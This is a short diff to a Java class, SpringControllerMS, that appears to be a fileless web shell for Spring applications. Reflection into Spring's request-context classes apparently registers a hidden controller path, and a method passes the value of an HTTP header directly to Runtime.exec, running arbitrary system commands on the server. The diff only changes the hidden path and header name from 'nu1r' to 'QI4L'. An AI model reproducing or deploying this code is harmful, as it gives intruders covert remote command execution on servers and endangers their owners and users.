@@ -10,7 +10,7 @@ public class SpringControllerMS {
 
     static {
         try {
-            final String controllerPath = "/nu1r";
+            final String controllerPath = "/QI4L";
             getClassLoader();
             Class<?> utilClass          = sayMyName("org.springframework.web.servlet.support.RequestContextUtils");
             Class<?> holder             = sayMyName("org.springframework.web.context.request.RequestContextHolder");
@@ -176,6 +176,6 @@ public class SpringControllerMS {
         getRequest.setAccessible(true);
         Object requestObj = getRequest.invoke(servletRequestAttributes);
         Method method     = getMethodByClass(httpServletRequest, "getHeader", new Class[]{String.class});
-        java.lang.Runtime.getRuntime().exec(method.invoke(requestObj, "nu1r").toString());
+        java.lang.Runtime.getRuntime().exec(method.invoke(requestObj, "QI4L").toString());
     }
 }
